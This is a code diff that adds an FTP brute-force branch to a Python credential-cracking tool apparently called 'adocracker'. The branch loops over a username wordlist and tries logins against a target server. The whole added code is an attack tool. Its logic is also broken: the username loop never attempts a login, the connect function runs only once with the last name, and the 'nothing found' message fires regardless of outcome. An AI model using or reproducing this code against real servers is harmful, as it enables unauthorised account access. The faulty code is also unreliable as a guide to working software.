@@ -319,4 +319,54 @@ elif args.service == "ssh":
 
 # Attacking FTP
 elif args.service == "ftp":
-    exit(0)
+    try:
+        print("\033[1;34m---------------------------------"
+              "\n     adocracker is started      "
+              "\n  Take a cup of coffee and wait"
+              "\n---------------------------------")
+
+        target = args.attack
+        port = args.port
+        username = args.login
+        username_file = args.login_file
+        password = args.password
+        password_file = args.password_file
+        colon_file = args.colon_file
+
+        # When single password provided
+        if args.password in sys.argv:
+            file = open(username_file)
+            user_list = file.readlines()
+
+            for user in user_list:
+                user = user.rstrip()
+
+
+            def connect_ftp():
+                server = ftplib.FTP()
+                if args.verbose in sys.argv:
+                    if args.verbose != "show":
+                        return False
+                    print('\033[1;37m''[+]', user, '_', password)
+                    try:
+                        server.connect(target, port, timeout=10)
+                        server.login(user, password)
+                    except ftplib.error_perm:
+                        pass
+                    else:
+                        print("\n\033[1;92m-----------------------------------------"
+                              "\n Username found:", user,
+                              "\n------------------------------------------")
+                        exit(0)
+
+
+            connect_ftp()
+    except KeyboardInterrupt:
+        print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
+        exit(0)
+    else:
+        print("\n\033[1;31m------------------------------------------------------------------"
+              "\n Sorry!! No password or username found on your wordlist"
+              "\n Please provide wordlist with more words to increase your chance"
+              "\n------------------------------------------------------------------")
+        exit(0)
